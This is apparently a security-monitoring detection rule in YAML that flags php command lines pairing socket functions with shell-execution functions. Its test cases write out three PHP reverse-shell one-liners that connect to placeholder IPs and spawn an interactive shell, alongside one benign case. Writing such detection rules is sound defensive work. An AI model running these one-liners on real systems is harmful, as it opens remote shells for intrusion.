name: rta_php_cli_reverse_shell
mode: alert
eval: |
  (
    e.process_name == "php" &&
    (
      re_match(e.process_args, "fsockopen\\(") ||
      re_match(e.process_args, "socket_create\\(") ||
      re_match(e.process_args, "stream_socket_client\\(")
    ) &&
    (
      re_match(e.process_args, "exec\\(") ||
      re_match(e.process_args, "shell_exec\\(") ||
      re_match(e.process_args, "system\\(") ||
      re_match(e.process_args, "passthru\\(")
    )
  )
tests:
  - cleartext: "php -r fsockopen reverse shell"
    process_name: php
    process_args: "php -r '$sock=fsockopen(\"10.10.10.10\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    should_match: true
  - cleartext: "php socket_create reverse shell"
    process_name: php
    process_args: "php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_connect($s,\"192.168.1.1\",8080);shell_exec(\"/bin/bash -i\");'"
    should_match: true
  - cleartext: "php stream_socket_client shell"
    process_name: php
    process_args: "php -r '$sock=stream_socket_client(\"tcp://10.0.0.1:4444\");exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    should_match: true
  - cleartext: "normal php script execution"
    process_name: php
    process_args: "php index.php"
    should_match: false
